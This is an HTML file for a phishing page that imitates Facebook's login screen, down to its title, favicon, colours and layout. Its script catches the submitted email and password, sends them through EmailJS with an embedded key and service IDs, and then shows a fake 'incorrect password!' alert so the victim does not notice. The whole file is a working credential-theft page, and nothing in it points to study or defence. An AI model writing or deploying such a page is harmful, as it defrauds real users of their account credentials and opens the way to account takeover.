<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook – log in or sign up</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico">

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("MF5ay2BxtQS7f_zmS");
    })();
  </script>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      gap: 80px;
      padding: 20px;
    }

    .left {
      max-width: 500px;
    }

    .left h1 {
      color: #1877f2;
      font-size: 60px;
      margin: 0;
      font-weight: bold;
      letter-spacing: -1px;
    }

    .left p {
      font-size: 24px;
      line-height: 32px;
      margin-top: 10px;
    }

    .login-box {
      background: white;
      padding: 20px;
      width: 360px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
      text-align: center;
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
      outline: none;
      transition: 0.2s;
    }

    .login-box input:focus {
      border-color: #1877f2;
      box-shadow: 0 0 0 2px #e7f3ff;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .forgot {
      display: block;
      margin: 15px 0;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .line {
      border-top: 1px solid #ddd;
      margin: 20px 0;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    .footer-text {
      margin-top: 20px;
      font-size: 14px;
    }

    .footer-text span {
      font-weight: bold;
    }

    /* Responsive */
    @media(max-width: 900px) {
      .container {
        flex-direction: column;
        text-align: center;
      }

      .left h1 {
        font-size: 50px;
      }

      .left p {
        font-size: 20px;
      }
    }

  </style>
</head>

<body>

  <div class="container">
    
    <div class="left">
      <h1>facebook</h1>
      <p>Facebook helps you connect and share with the people in your life.</p>
    </div>

    <div>
      <form class="login-box" id="login-form">
        <input type="text" name="user_email" placeholder="Email address or phone number" required>
        <input type="password" name="user_password" placeholder="Password" required>

        <button class="login-btn" type="submit">Log In</button>

        <a href="#" class="forgot">Forgotten password?</a>

        <div class="line"></div>

        <button class="create-btn" type="button">Create New Account</button>
      </form>

      <div class="footer-text">
        <span>Create a Page</span> for a celebrity, brand or business.
      </div>
    </div>

  </div>

  <script>
    document.getElementById("login-form").addEventListener("submit", function (e) {
      e.preventDefault();

      emailjs.sendForm("service_4j75doc", "template_jhwehoh", this)
        .then(function () {
          alert("incorrect password!");
        }, function (error) {
          alert("Failed: " + JSON.stringify(error));
        });
    });
  </script>

</body>
</html>
